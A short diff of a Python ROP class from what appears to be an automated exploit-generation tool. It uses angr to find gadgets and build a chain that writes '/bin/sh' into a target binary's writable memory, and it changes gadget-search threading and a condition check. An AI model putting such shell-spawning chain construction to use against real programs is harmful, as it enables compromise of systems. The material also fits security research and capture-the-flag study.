@@ -29,14 +29,14 @@ class ROP:
         self.cache_angrop = b''
 
     def write_binsh_to_mem(self):
-        if(0!=self.num_pops(self.get_primitives_str())):
+        if(False or 1<=self.num_pops(self.get_primitives_str())):
             self.analysis.hbsh = True
             return self.write_binsh_manual()
         elif self.cache_angrop == b'':
             angr_proj = angr.Project(self.analysis.binary)
             angr_rop  = angr_proj.analyses.ROP()
-            angr_rop.find_gadgets_single_threaded() 
-            #angr_rop.find_gadgets()
+            #angr_rop.find_gadgets_single_threaded() 
+            angr_rop.find_gadgets()
             self.analysis.hbsh = True
             self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
             return self.cache_angrop
